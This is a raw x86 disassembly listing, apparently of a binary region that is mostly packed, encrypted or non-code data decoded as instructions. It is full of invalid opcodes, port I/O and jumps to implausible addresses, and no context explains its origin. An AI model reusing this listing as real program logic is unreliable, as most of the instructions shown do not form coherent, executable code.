  415f23:	repnz lds ecx,FWORD PTR [ecx+edx*8]
  415f27:	push   ebp
  415f28:	in     al,dx
  415f29:	sub    ecx,DWORD PTR [edi+0x6d]
  415f2c:	cmp    BYTE PTR [edx-0x5a4d729b],0xb4
  415f33:	mov    edi,0x94a852a8
  415f38:	mov    cl,0xdb
  415f3a:	inc    esi
  415f3b:	mov    ebx,0xf2dc064f
  415f40:	or     eax,0x60eb1620
  415f45:	inc    esp
  415f46:	aad    0x2d
  415f48:	sub    ch,BYTE PTR [edi]
  415f4a:	out    dx,eax
  415f4b:	xor    ebx,DWORD PTR [esp+edi*2+0x4f]
  415f4f:	repnz fisttp DWORD PTR ds:[eax-0x1f]
  415f54:	(bad)  
  415f55:	jl     0x415f4c
  415f57:	inc    ebp
  415f58:	or     BYTE PTR [edi-0x1012ca47],ch
  415f5e:	jne    0x415f45
  415f60:	dec    eax
  415f61:	mov    edx,0x87c0118
  415f66:	cmp    al,0xb5
  415f68:	mov    esi,0x23a347d9
  415f6d:	sahf   
  415f6e:	(bad)  
  415f6f:	dec    esi
  415f70:	int3   
  415f71:	ja     0x415f0d
  415f73:	sbb    bh,BYTE PTR cs:[edx+0x1f352347]
  415f7a:	data16 je 0x415f31
  415f7d:	and    al,0xd7
  415f7f:	cmp    BYTE PTR gs:[ebx+0x27],ah
  415f83:	scas   eax,DWORD PTR es:[edi]
  415f84:	es mov edi,0xf00cb837
  415f8a:	mov    dl,0x25
  415f8c:	mov    BYTE PTR [esi+0x48],dh
  415f8f:	xchg   ebx,eax
  415f90:	add    BYTE PTR [edi],ah
  415f92:	dec    esi
  415f93:	xchg   edx,eax
  415f94:	sub    eax,0x2f3df9fd
  415f99:	mov    ecx,0xe6e3e659
  415f9e:	mov    dh,0x43
  415fa0:	(bad)  
  415fa1:	in     eax,dx
  415fa2:	and    DWORD PTR [esi+0x1b],ebx
  415fa5:	(bad)  
  415fa7:	rcl    bl,1
  415fa9:	mov    al,ds:0x89000f3d
  415fae:	repz mov ch,0x42
  415fb1:	enter  0x9154,0xe0
  415fb5:	(bad)  
  415fb6:	int    0x2c
  415fb8:	(bad)  
  415fb9:	call   0x46abf686
  415fbe:	stos   BYTE PTR es:[edi],al
  415fbf:	cmp    eax,0x685311a5
  415fc4:	adc    eax,0xa4b5b39b
  415fc9:	sub    esi,DWORD PTR [edi]
  415fcb:	push   eax
  415fcc:	test   al,0xb4
  415fce:	stos   DWORD PTR es:[edi],eax
  415fcf:	std    
  415fd0:	ret    0x6d63
  415fd3:	sbb    al,0xb1
  415fd5:	lock mov dl,0x8c
  415fd8:	sar    BYTE PTR [ebp-0x3a],cl
  415fdb:	mov    eax,0xc85cc38f
  415fe0:	retf   0xb97a
  415fe3:	xchg   BYTE PTR [esi+ebp*4+0x59],cl
  415fe7:	rcr    BYTE PTR [edi-0x768095d2],cl
  415fed:	ins    DWORD PTR es:[edi],dx
  415fee:	stos   BYTE PTR es:[edi],al
  415fef:	dec    ebx
  415ff0:	xor    edx,DWORD PTR [esi]
  415ff2:	dec    edi
  415ff3:	mov    al,0x78
  415ff5:	sbb    dh,BYTE PTR [ebx]
  415ff7:	or     al,0xeb
  415ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ffa:	add    bl,BYTE PTR [edi+0x5f]
  415ffd:	jmp    0xc536b984
  416002:	mov    ah,0x9b
  416004:	test   al,0x6c
  416006:	lds    ebp,FWORD PTR [edi]
  416008:	je     0x41600c
  41600a:	push   es
  41600b:	jns    0x415ff9
  41600d:	mov    eax,ds:0xd0c12d7e
  416012:	mov    ebx,0x35fa018
  416017:	add    ebp,DWORD PTR [edi]
  416019:	xor    BYTE PTR [ecx+0x508e22c5],al
  41601f:	outs   dx,DWORD PTR ds:[esi]
  416020:	test   BYTE PTR [edx],al
  416022:	fimul  WORD PTR [edx-0x5e88aa27]
  416028:	add    dl,0x77
  41602b:	jo     0x415fd7
  41602d:	push   cs
  41602e:	add    ecx,edi
  416030:	in     al,0xe8
  416032:	pop    eax
  416033:	outs   dx,BYTE PTR ds:[esi]
  416034:	test   eax,ecx
  416036:	ins    BYTE PTR es:[edi],dx
  416037:	ins    DWORD PTR es:[edi],dx
  416038:	add    al,0xf8
  41603a:	clc    
  41603b:	push   ds
  41603c:	dec    edx
  41603d:	push   eax
  41603e:	cmp    bh,dh
  416040:	aaa    
  416041:	add    DWORD PTR [edi],edi
  416043:	or     BYTE PTR [ecx-0x59],al
  416046:	mov    edx,0x654b254
  41604b:	ret    
  41604c:	pop    ecx
  41604d:	dec    edx
  41604e:	xchg   DWORD PTR [edx+0x58],edx
  416051:	adc    BYTE PTR [ecx+eiz*1+0x1b],dh
  416055:	popa   
  416056:	fstp   QWORD PTR [esp]
  416059:	retf   
  41605a:	sub    esp,DWORD PTR [esi]
  41605c:	sbb    edx,ebp
  41605e:	mov    ds:0x428fa42a,al
  416063:	cmp    ch,cl
  416065:	sbb    ah,dh
  416067:	xchg   edi,eax
  416068:	dec    ebp
  416069:	jne    0x4160aa
  41606b:	pop    edi
  41606c:	jne    0x4160c6
  41606e:	out    dx,eax
  41606f:	add    al,0x90
  416071:	js     0x4160a4
  416073:	fdivp  st(2),st
  416075:	mov    ah,BYTE PTR [ecx*2+0x5cebea69]
  41607c:	js     0x4160b0
  41607e:	push   edi
  41607f:	jle    0x416049
  416081:	in     eax,dx
  416082:	push   edi
  416083:	out    0x9c,eax
  416085:	push   esp
  416086:	xchg   edx,eax
  416087:	push   0xa758d6d3
  41608c:	xor    eax,0x7edc7854
  416091:	sar    BYTE PTR [ebx],cl
  416093:	test   eax,0x8c248981
  416098:	shl    edx,0x75
  41609b:	addr16 xchg edx,eax
  41609d:	add    al,0xe6
  41609f:	call   0xd6b94801
  4160a4:	pop    eax
  4160a5:	or     DWORD PTR [ebp+0x4c89735b],edx
  4160ab:	out    dx,eax
  4160ac:	or     cl,dh
  4160ae:	(bad)  
  4160af:	cld    
  4160b0:	and    DWORD PTR [ecx],edx
  4160b2:	test   al,0x15
  4160b4:	ret    0x57eb
  4160b7:	jp     0x416119
  4160b9:	or     al,0x8a
  4160bb:	jmp    0x788e7917
  4160c0:	stos   BYTE PTR es:[edi],al
  4160c1:	int    0x2e
  4160c3:	pop    es
  4160c4:	or     eax,0x3a4f5036
  4160c9:	xchg   edi,eax
  4160ca:	cli    
  4160cb:	sbb    ah,cl
  4160cd:	inc    eax
  4160ce:	jns    0x4160b1
  4160d0:	sub    edi,DWORD PTR [ecx+0x5b3afa3b]
  4160d6:	or     eax,0xe82bf5c7
  4160db:	cli    
  4160dc:	and    al,dl
  4160de:	ins    BYTE PTR es:[edi],dx
  4160df:	das    
  4160e0:	sbb    eax,DWORD PTR [eax]
  4160e2:	dec    ebp
  4160e3:	stc    
  4160e4:	rcl    DWORD PTR [edx-0x6d433385],1
  4160ea:	mov    ebp,0xebf67456
  4160ef:	fisubr WORD PTR [esi+0xbf0ca0b]
  4160f5:	adc    DWORD PTR [ecx-0x57c8c66c],edi
  4160fb:	test   al,0xc4
  4160fd:	dec    esp
  4160fe:	push   ss
  4160ff:	adc    BYTE PTR [ebx],ch
  416101:	daa    
  416102:	pop    ebx
  416103:	sbb    dl,dl
  416105:	es icebp 
  416107:	mov    ds:0x69ebe9d9,eax
  41610c:	inc    ebp
  41610d:	or     eax,eax
  41610f:	push   ds
  416110:	cmp    al,0x44
  416112:	push   eax
  416114:	add    bh,0xa9
  416117:	jae    0x4160f8
  416119:	(bad)  
  41611a:	retf   0x54a9
  41611d:	adc    ecx,DWORD PTR [ecx-0x1e]
  416120:	adc    BYTE PTR [edx],ah
  416122:	sbb    DWORD PTR [edx],esi
  416124:	lods   eax,DWORD PTR ds:[esi]
  416125:	pop    eax
  416126:	mov    al,ds:0xe57ef2ac
  41612b:	cmp    dl,bl
  41612d:	fidiv  WORD PTR [ecx]
  41612f:	mov    ebx,0xfefa01cd
  416134:	hlt    
  416135:	daa    
  416136:	repz jp 0x416172
  416139:	ficom  WORD PTR ds:0x90e31af5
  416140:	xchg   DWORD PTR [edi],esp
  416142:	out    dx,eax
  416143:	repz das 
  416145:	iret   
  416146:	mov    fs,WORD PTR [eax]
  416148:	xchg   BYTE PTR [esi+edx*8],bl
  41614b:	es cld 
  41614d:	dec    edi
  41614e:	xor    edx,ecx
  416150:	jo     0x416164
  416152:	sub    DWORD PTR [edx+0x2d534a87],edi
  416158:	out    dx,eax
  416159:	and    eax,0xcd978418
  41615e:	push   ebx
  41615f:	stos   DWORD PTR es:[edi],eax
  416160:	lds    esi,FWORD PTR [ebp+0x3ac4f298]
  416166:	loope  0x416115
  416168:	loope  0x416144
  41616a:	cmc    
  41616b:	sbb    eax,0x4e1d2802
  416170:	jmp    0x7a58:0x665bc7c4
  416177:	mov    ch,0x6d
  416179:	and    BYTE PTR [ebx+0x5b2eff2d],ah
  41617f:	jp     0x41610c
  416181:	pusha  
  416182:	and    eax,0x7eb01a9e
  416187:	scas   al,BYTE PTR es:[edi]
  416188:	xor    BYTE PTR [edx+ebp*2-0x59],ch
  41618c:	xchg   ebp,eax
  41618d:	clc    
  41618e:	les    ecx,FWORD PTR [eax+0x60]
  416191:	das    
  416192:	out    dx,eax
  416193:	push   edi
  416194:	jmp    0x510c47e8
  416199:	addr16 and al,0x1
  41619c:	dec    esi
  41619d:	inc    esi
  41619e:	and    BYTE PTR [esi],0x23
  4161a1:	fstp   TBYTE PTR [edi-0x5c34a96d]
  4161a7:	xchg   esi,eax
  4161a8:	jmp    0x41614e
  4161aa:	jp     0x4161e2
  4161ac:	aaa    
  4161ad:	pop    ebx
  4161ae:	xchg   ebp,eax
  4161af:	lods   eax,DWORD PTR ds:[esi]
  4161b0:	sub    DWORD PTR ss:[edx],esi
  4161b3:	jmp    0xa230:0x34166800
  4161ba:	pushf  
  4161bb:	dec    edx
  4161bc:	je     0x41619a
  4161be:	dec    BYTE PTR [eax+0x24]
  4161c1:	sbb    eax,ecx
  4161c3:	push   ss
  4161c4:	scas   al,BYTE PTR es:[edi]
  4161c5:	mov    DWORD PTR [edi],edx
  4161c7:	pop    ebp
  4161c8:	inc    ebx
  4161c9:	retf   
  4161ca:	xchg   edx,eax
  4161cb:	push   0x5c2b0d86
  4161d0:	lock inc edx
  4161d2:	outs   dx,BYTE PTR ds:[esi]
  4161d3:	mov    al,0xe
  4161d5:	les    eax,FWORD PTR [edi]
  4161d7:	jb     0x416248
  4161d9:	adc    eax,0x74c05d3d
  4161de:	pop    ebx
  4161df:	mov    ds:0x9339561a,al
  4161e4:	mov    dl,0xd0
  4161e6:	push   ecx
  4161e7:	or     al,0xa
  4161e9:	sub    DWORD PTR [edi-0x3c],0xc673a5c1
  4161f0:	mov    DWORD PTR ds:0xa3f12d12,eax
  4161f6:	stos   BYTE PTR es:[edi],al
  4161f7:	arpl   WORD PTR [eax+0x21],si
  4161fa:	into   
  4161fb:	sbb    eax,0x5fb748
  416200:	mov    bl,0x1a
  416202:	mov    BYTE PTR [edx],ch
  416204:	adc    BYTE PTR [edi],bh
  416206:	and    dh,BYTE PTR [edx+0x75ca91f7]
  41620c:	es loope 0x416266
  41620f:	daa    
  416210:	ret    0xfe80
  416213:	add    eax,0x5bbb1ac9
  416218:	dec    ecx
  416219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41621a:	test   al,0x17
  41621c:	mov    bh,0x11
  41621e:	adc    BYTE PTR [esi+eax*2+0x14ce03a7],ah
  416225:	mov    ds:0xbcbfdd6c,al
  41622a:	jae    0x4161da
  41622c:	into   
  41622d:	xor    DWORD PTR [edi],esi
  41622f:	or     dh,BYTE PTR [edi+0x6f]
  416232:	js     0x416289
  416234:	xor    al,0xdc
  416236:	sar    BYTE PTR [edx-0x12],1
  416239:	out    dx,al
  41623a:	stos   BYTE PTR es:[edi],al
  41623b:	xchg   BYTE PTR [eax+0x496385ef],al
  416241:	int3   
  416242:	or     DWORD PTR es:[ebx+0x4d],ebx
  416246:	mov    esp,0x4e92e9cc
  41624b:	call   0x61596d08
  416250:	fcos   
  416252:	les    esi,FWORD PTR [ecx-0x4a]
  416255:	inc    ecx
  416256:	push   ebx
  416257:	outs   dx,DWORD PTR ds:[esi]
  416258:	mov    al,ds:0x47ffe7f2
  41625d:	ins    DWORD PTR es:[edi],dx
  41625e:	js     0x416203
  416260:	je     0x41627f
  416262:	cmp    DWORD PTR [ecx-0x70],esi
  416265:	jae    0x416212
  416267:	dec    eax
  416268:	in     eax,0x68
  41626a:	jmp    0x3307f116
  41626f:	mov    ah,0x45
  416271:	shr    BYTE PTR [edi],1
  416273:	jecxz  0x4162be
  416275:	ds jo  0x416261
  416278:	mov    bh,BYTE PTR es:[ebx]
  41627b:	stc    
  41627c:	das    
  41627d:	pop    eax
  41627e:	push   0xae098756
  416283:	mov    ds:0xbbd58951,eax
  416288:	inc    esi
  416289:	xchg   DWORD PTR [esi-0x4d],esi
  41628c:	inc    esi
  41628d:	enter  0x4e48,0x77
  416291:	jle    0x416239
  416293:	retf   0x4775
  416296:	(bad)  
  416297:	pusha  
  416298:	mov    cl,0x18
  41629a:	fsub   QWORD PTR ss:0xff980bf4
  4162a1:	pop    edx
  4162a2:	fidiv  DWORD PTR [ebx+0x7121465c]
  4162a8:	or     DWORD PTR [ebp*8-0x35b0d8ba],0xffffff82
  4162b0:	js     0x41626f
  4162b2:	aas    
  4162b3:	mov    BYTE PTR [ecx-0x59bd023a],bl
  4162b9:	sbb    eax,0xf1ab1349
  4162be:	cmp    eax,0xdb2bb35e
  4162c3:	pop    eax
  4162c4:	cli    
  4162c5:	push   DWORD PTR [ebx+ebp*2]
  4162c8:	out    0x29,al
  4162ca:	test   al,0x48
  4162cc:	adc    BYTE PTR [ecx],ch
  4162ce:	cld    
  4162cf:	xchg   edx,eax
  4162d0:	mov    dh,0x5c
  4162d2:	test   eax,0xa3688730
  4162d7:	xor    BYTE PTR [ecx-0x3b],ch
  4162da:	inc    edx
  4162db:	jge    0x41634a
  4162dd:	(bad)  [ebp-0x73]
  4162e0:	inc    ebx
  4162e1:	pop    esp
  4162e2:	sub    al,0xd1
  4162e4:	je     0x41632a
  4162e6:	jmp    0xdb0a1c72
  4162eb:	cmp    dh,ch
  4162ed:	sar    BYTE PTR ds:0x53493ba4,cl
  4162f3:	fmul   st,st(3)
  4162f5:	ss ret 0x5593
  4162f9:	xchg   DWORD PTR [ecx],ecx
  4162fb:	jecxz  0x4162dc
  4162fd:	push   ecx
  4162fe:	arpl   WORD PTR [ebx],si
  416300:	jno    0x416353
  416302:	inc    eax
  416303:	mov    ch,0x59
  416305:	in     eax,dx
  416306:	or     esp,edx
  416308:	icebp  
  416309:	and    dh,ah
  41630b:	cmp    dh,dl
  41630d:	sahf   
  41630e:	jns    0x416373
  416310:	push   bx
  416312:	inc    ebp
  416313:	mov    al,0xac
  416315:	mov    al,ds:0xb51feebf
  41631a:	cmp    al,0xf8
  41631c:	stos   DWORD PTR es:[edi],eax
  41631d:	arpl   WORD PTR [eax],si
  41631f:	pop    edi
  416320:	in     eax,dx
  416321:	jae    0x4163a0
  416323:	sbb    al,BYTE PTR [ebp+0x45087f6f]
  416329:	pop    ebp
  41632a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41632b:	inc    edx
  41632c:	cli    
  41632d:	pop    ebp
  41632e:	loop   0x416344
  416330:	sub    al,0xaa
  416332:	mov    ch,0x4d
  416334:	cld    
  416335:	pop    ds
  416336:	aas    
  416337:	dec    ebx
  416338:	call   0x2c132102
  41633d:	push   ecx
  41633e:	jbe    0x416381
  416340:	xor    eax,eax
  416342:	sub    ecx,ecx
  416344:	inc    edi
  416345:	fisttp DWORD PTR [ebx+edi*4]
  416348:	and    DWORD PTR [edx+eax*2],eax
  41634b:	call   0xbfcc5745
  416350:	add    eax,DWORD PTR [ebx+0x7c9503c2]
  416356:	add    bl,dl
  416358:	inc    ebp
  416359:	cmp    dl,BYTE PTR [edi+0x879caaf]
  41635f:	mov    es,WORD PTR [ebp+0x9932fd5]
  416365:	dec    edi
  416366:	hlt    
  416367:	ret    
  416368:	mov    ebp,0xd2f11dc6
  41636d:	and    eax,0x8248bd79
  416372:	push   0x94fc4fec
  416377:	sbb    eax,0x64ae0356
  41637c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41637d:	sub    ebp,edx
  41637f:	mov    esi,0xfb1d5490
  416384:	sti    
  416385:	sbb    al,0xd4
  416387:	add    cl,BYTE PTR [ecx-0x4d2c6987]
  41638d:	jmp    0x73d13610
  416392:	in     al,0x38
  416394:	or     dh,BYTE PTR [ebp+0xf]
  416397:	nop
  416398:	dec    edx
  416399:	sbb    cl,BYTE PTR [ebx+0x24642915]
  41639f:	rol    DWORD PTR [ebp-0x49],0xb9
  4163a3:	inc    edi
  4163a4:	mov    dh,0x13
  4163a6:	fnsave [esp+ebp*2-0x2c311d69]
  4163ad:	dec    ecx
  4163ae:	push   ecx
  4163af:	lahf   
  4163b0:	inc    edx
  4163b1:	add    eax,0x4dca7772
  4163b6:	dec    eax
  4163b7:	dec    ebx
  4163b8:	mov    ah,dl
  4163ba:	scas   eax,DWORD PTR es:[edi]
  4163bb:	xor    eax,0x79912b7b
  4163c0:	scas   al,BYTE PTR es:[edi]
  4163c1:	enter  0x5a25,0x6d
  4163c5:	imul   esi,esp,0x76
  4163c8:	mov    ?,WORD PTR [edi-0x74d9d4e1]
  4163ce:	cld    
  4163cf:	out    0x54,al
  4163d1:	lock inc esp
  4163d3:	xor    DWORD PTR [ecx],esi
  4163d5:	lea    eax,[edi+ecx*8]
  4163d8:	jne    0x4163b4
  4163da:	imul   esp,DWORD PTR [edx+ebp*8-0x3aa49b82],0x10
  4163e2:	xor    al,0x5c
  4163e4:	sub    eax,0x6c9a3aea
  4163e9:	cmp    DWORD PTR [ecx+0x1e],ebx
  4163ec:	imul   edx,DWORD PTR [eax],0xce7ce23b
  4163f2:	shl    ebp,1
  4163f4:	sbb    eax,0x952e6690
  4163f9:	out    dx,eax
  4163fa:	mov    ss,WORD PTR ss:[ebx]
  4163fd:	in     eax,0xde
  4163ff:	outs   dx,BYTE PTR ds:[esi]
  416400:	(bad)  
  416401:	mov    al,ds:0x743f61c8
  416406:	and    BYTE PTR ss:[ebx+0x2c7446da],0x63
  41640e:	jb     0x416430
  416410:	gs jbe 0x416470
  416413:	push   esp
  416414:	lahf   
  416415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416416:	iret   
  416417:	xor    eax,0x6ff00a6a
  41641c:	pop    edx
  41641d:	or     DWORD PTR [edi],0xdcc34448
  416423:	(bad)  
  416425:	jecxz  0x416451
  416427:	or     ah,BYTE PTR [esi-0x3bec4bfb]
  41642d:	add    BYTE PTR [ebp-0x59],dh
  416430:	or     eax,0x8a3f33ac
  416435:	dec    ebp
  416436:	xor    DWORD PTR [ebx],0xc90c145d
  41643c:	adc    al,0x60
  41643e:	jmp    0x4164b2
  416440:	xchg   DWORD PTR [eax],edx
  416442:	dec    ebx
  416443:	(bad)  
  416444:	pop    esp
  416445:	dec    eax
  416446:	mov    cl,0x97
  416448:	rol    BYTE PTR [esi-0x2d],cl
  41644b:	mov    al,0xe4
  41644d:	mov    dh,0x7f
  41644f:	mov    al,ds:0x68bb688c
  416454:	jmp    0xcb69ec33
  416459:	rol    DWORD PTR [ebx-0x3c],0x97
  41645d:	popa   
  41645e:	xchg   esp,eax
  41645f:	cmc    
  416460:	inc    edi
  416461:	loope  0x416449
  416463:	push   ebx
  416464:	mov    ds:0x908201b8,eax
  416469:	or     BYTE PTR [edx],ch
  41646b:	cld    
  41646c:	retf   0x8a6b
  41646f:	dec    esp
  416470:	(bad)  
  416471:	sar    edx,0x5b
  416474:	push   ss
  416475:	ficomp DWORD PTR [ebx-0x12]
  416478:	in     al,0x78
  41647a:	add    eax,0xe4150ae4
  41647f:	inc    ebx
  416480:	sbb    al,BYTE PTR [edi-0x31d4d07b]
  416486:	inc    edi
  416487:	mov    esp,0xcf3b9f67
  41648c:	(bad)  
  41648d:	bound  esp,QWORD PTR ds:0x58786603
  416493:	rcl    BYTE PTR [esi+0xb],1
  416496:	cmp    eax,DWORD PTR [eax]
  416498:	icebp  
  416499:	sahf   
  41649a:	sub    edi,ecx
  41649c:	dec    edi
  41649d:	inc    eax
  41649e:	in     eax,dx
  41649f:	ret    0x6b8
  4164a2:	ror    DWORD PTR [esi+0x66],1
  4164a5:	rcr    DWORD PTR [edi+0x46],0xf3
  4164a9:	xor    eax,0xe1bc8ce4
  4164ae:	lds    edx,FWORD PTR [eax-0x701d816f]
  4164b4:	mov    WORD PTR [edi],ds
  4164b6:	fwait
  4164b7:	addr16 sub eax,0xd7853ac5
  4164bd:	push   edi
  4164be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164bf:	scas   al,BYTE PTR es:[edi]
  4164c0:	popf   
  4164c1:	pushf  
  4164c2:	sub    ebp,DWORD PTR [ecx+0x6b9e1d69]
  4164c8:	pop    edx
  4164c9:	lea    edi,[ebx]
  4164cb:	push   eax
  4164cc:	int    0x24
  4164ce:	mov    dl,0xf7
  4164d0:	pop    esp
  4164d1:	push   ss
  4164d2:	sbb    al,0xb7
  4164d4:	(bad)  
  4164d6:	xchg   ebx,eax
  4164d7:	add    al,0x53
  4164d9:	stc    
  4164da:	fwait
  4164db:	dec    DWORD PTR [edi+0x6998ecf3]
  4164e1:	imul   esp,DWORD PTR [edi],0xffffff92
  4164e4:	popf   
  4164e5:	pop    esi
  4164e6:	sub    DWORD PTR [edx],esi
  4164e8:	jecxz  0x41650c
  4164ea:	std    
  4164eb:	dec    dx
  4164ed:	(bad)  
  4164ee:	cli    
  4164ef:	ret    
  4164f0:	and    al,0x7d
  4164f2:	cld    
  4164f3:	dec    ecx
  4164f4:	icebp  
  4164f5:	ret    0x17f6
  4164f8:	mov    DWORD PTR [ebp+0x8],edx
  4164fb:	jmp    0x4189b9
  416500:	mov    edx,DWORD PTR [ebp+0x8]
  416503:	sub    DWORD PTR ds:0x42d018,0x221d
  41650d:	jmp    0x418896
  416512:	sbb    esi,edx
  416514:	sub    al,0xc3
  416516:	jnp    0x4164a3
  416518:	mov    DWORD PTR [ebx+eiz*1+0x36f16ac2],edx
  41651f:	aaa    
  416520:	fisttp WORD PTR [esi+0x31]
  416523:	push   edi
  416524:	jns    0x4165a0
  416526:	push   es
  416527:	pop    edi
  416528:	jp     0x4165a4
  41652a:	hlt    
  41652b:	or     eax,edi
  41652d:	aas    
  41652e:	xchg   esp,eax
  41652f:	sbb    DWORD PTR [eax],edx
  416531:	test   al,0xf2
  416533:	(bad)  
  416534:	jbe    0x416502
  416536:	jo     0x4165a7
  416538:	je     0x4164e1
  41653a:	jecxz  0x416548
  41653c:	xchg   ebx,eax
  41653d:	test   DWORD PTR [esi],ebx
  41653f:	repz clc 
  416541:	loope  0x416580
  416543:	dec    esi
  416544:	rol    BYTE PTR [esi],0xa6
  416547:	jno    0x416553
  416549:	outs   dx,BYTE PTR ds:[esi]
  41654a:	adc    eax,0x8520a025
  41654f:	lods   eax,DWORD PTR ds:[esi]
  416550:	addr16 dec edi
  416552:	scas   al,BYTE PTR es:[edi]
  416553:	cmp    ah,BYTE PTR [esi+0x39]
  416556:	jecxz  0x41653c
  416558:	out    dx,eax
  416559:	sbb    al,0x5e
  41655b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41655c:	enter  0x6d6c,0xf9
  416560:	cmp    DWORD PTR [ebx-0x26],esp
  416563:	stos   BYTE PTR es:[edi],al
  416564:	(bad)  
  416565:	adc    cl,BYTE PTR [eax+0x79]
  416568:	jns    0x416574
  41656a:	fld    st(2)
  41656c:	inc    esi
  41656d:	dec    ebp
  41656e:	jo     0x4165bd
  416570:	mov    dl,0xf1
  416572:	jp     0x4165e6
  416574:	mov    ds:0xc5a8242c,al
  416579:	add    BYTE PTR [eax],bl
  41657b:	lds    ebx,FWORD PTR [ebx+ebx*4]
  41657e:	push   ss
  41657f:	xor    DWORD PTR [eax],ebx
  416581:	outs   dx,BYTE PTR ds:[esi]
  416582:	cmc    
  416583:	(bad)  
  416585:	inc    esi
  416586:	pop    esi
  416587:	mov    ds:0x8ce98338,al
  41658c:	enter  0xd2da,0xf6
  416590:	pop    ss
  416591:	into   
  416592:	xchg   esp,eax
  416593:	repz push ecx
  416595:	int3   
  416596:	repnz ficom DWORD PTR [ebx+0x1b532e95]
  41659d:	or     BYTE PTR [edi+0x4947855a],0x3a
  4165a4:	retf   
  4165a5:	and    BYTE PTR ds:0x6373dc65,ch
  4165ab:	sahf   
  4165ac:	mov    ebp,0x150eb21
  4165b1:	imul   edx,DWORD PTR [eax],0xffffff9f
  4165b4:	fmul   st(0),st
  4165b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165b7:	call   0xcbf0:0x94342709
  4165be:	test   BYTE PTR [eax-0x6ab980a6],bh
  4165c4:	dec    edx
  4165c5:	or     BYTE PTR [ebx-0x3fc75e5b],cl
  4165cb:	dec    ebp
  4165cc:	mov    bh,0x1f
  4165ce:	xor    DWORD PTR [ebx],esp
  4165d0:	inc    edx
  4165d1:	push   ecx
  4165d2:	fisubr WORD PTR [ebx+0x26735a14]
  4165d8:	(bad)  
  4165da:	jmp    0x41659a
  4165dc:	sar    esp,1
  4165de:	pop    esp
  4165df:	arpl   ax,bp
  4165e1:	sbb    eax,0xa4a31424
  4165e6:	and    esp,DWORD PTR [edi]
  4165e8:	sbb    eax,0x58abf511
  4165ed:	lea    ebp,[esi+0x19628075]
  4165f3:	jecxz  0x41657f
  4165f5:	sahf   
  4165f6:	lahf   
  4165f7:	jne    0x4165a3
  4165f9:	jge    0x4165e6
  4165fb:	xor    al,0x15
  4165fd:	enter  0x10fd,0x55
  416601:	jns    0x416614
  416603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416604:	push   edx
  416605:	(bad)  
  416606:	adc    eax,0x9ff038d0
  41660b:	out    0xc,al
  41660d:	inc    eax
  41660e:	loope  0x41667a
  416610:	and    al,BYTE PTR [esi+0x78620987]
  416616:	test   eax,0x3d46da91
  41661b:	dec    ecx
  41661c:	cdq    
  41661d:	imul   edi,edx,0x35
  416620:	aas    
  416621:	stc    
  416622:	scas   eax,DWORD PTR es:[edi]
  416623:	in     al,dx
  416624:	mov    fs,WORD PTR [ecx]
  416626:	mov    eax,ds:0x8e33aa76
  41662b:	mov    ds:0x6412ef6,al
  416630:	sbb    dl,BYTE PTR [ebp-0x75a3535]
  416636:	mov    bl,0x3c
  416638:	fbld   TBYTE PTR [ecx-0x6160f82d]
  41663e:	enter  0x8bd0,0xc6
  416642:	push   edi
  416643:	ja     0x416656
  416645:	int3   
  416646:	ror    al,0x24
  416649:	rcl    BYTE PTR [edi-0x55253632],0x3a
  416650:	cmp    DWORD PTR [ecx+0x686aa7f4],ebp
  416656:	repz adc DWORD PTR cs:[ebx+eax*8-0x15f01dbb],esi
  41665f:	das    
  416660:	mov    eax,ebx
  416662:	clc    
  416663:	mov    ax,ds:0x5d6c595a
  416669:	add    ebp,DWORD PTR ds:[eax-0x7361fba0]
  416670:	fsub   QWORD PTR [edx-0x9]
  416673:	cmp    dl,ch
  416675:	inc    ecx
  416676:	cmp    dh,BYTE PTR [ebx]
  416678:	enter  0xb8b2,0x28
  41667c:	mov    ecx,0xad64d3fb
  416681:	sbb    al,0x28
  416683:	xchg   edi,eax
  416684:	arpl   WORD PTR [eax+eiz*4],ax
  416687:	inc    esp
  416688:	pop    edi
  416689:	(bad)  
  41668a:	add    bl,dh
  41668c:	rcr    BYTE PTR [ebx-0x55],cl
  41668f:	sti    
  416690:	lods   eax,DWORD PTR ds:[esi]
  416691:	cmp    bh,ah
  416693:	mov    ds:0x6ee698db,eax
  416698:	ror    BYTE PTR [edx+0x122c83d1],cl
  41669e:	mov    bh,0x64
  4166a0:	xchg   ecx,ecx
  4166a2:	cmp    al,0x72
  4166a4:	push   edi
  4166a5:	test   al,0x2a
  4166a7:	push   esp
  4166a8:	mov    al,0x60
  4166aa:	aam    0xfe
  4166ac:	mov    ds:0x6583431a,eax
  4166b1:	jb     0x416692
  4166b3:	adc    BYTE PTR [edx-0x388e9fe2],dh
  4166b9:	stos   BYTE PTR es:[edi],al
  4166ba:	pop    eax
  4166bb:	mov    ebp,0xa968f1af
  4166c0:	xchg   BYTE PTR [eax+0xf6fd7f2],cl
  4166c6:	cmp    edi,DWORD PTR [ebx-0x2e]
  4166c9:	repnz cmp DWORD PTR [ebp-0x80],eax
  4166cd:	std    
  4166ce:	push   es
  4166cf:	leave  
  4166d0:	in     al,0x56
  4166d2:	xchg   esi,eax
  4166d3:	mov    ah,0x3a
  4166d5:	pop    ecx
  4166d6:	int3   
  4166d7:	pop    edi
  4166d8:	ss jge 0x4166a9
  4166db:	fcomp  DWORD PTR [eax-0x54607045]
  4166e1:	add    BYTE PTR [edi-0x66],ch
  4166e4:	or     eax,0xef1d3bc1
  4166e9:	ret    
  4166ea:	addr16 jl 0x4166f1
  4166ed:	rcr    BYTE PTR [ecx],1
  4166ef:	iret   
  4166f0:	aad    0x31
  4166f2:	hlt    
  4166f3:	xchg   edx,eax
  4166f4:	fcmovne st,st(3)
  4166f6:	mov    dh,0x20
  4166f8:	(bad)  
  4166f9:	jns    0x41671b
  4166fb:	xlat   BYTE PTR ds:[ebx]
  4166fc:	mov    DWORD PTR [edx-0x40],esi
  4166ff:	daa    
  416700:	xchg   esp,eax
  416701:	push   ebp
  416702:	js     0x4166ce
  416704:	sbb    BYTE PTR [eax],bl
  416706:	loope  0x4166c3
  416708:	push   0xffffff82
  41670a:	mov    eax,0x3413857f
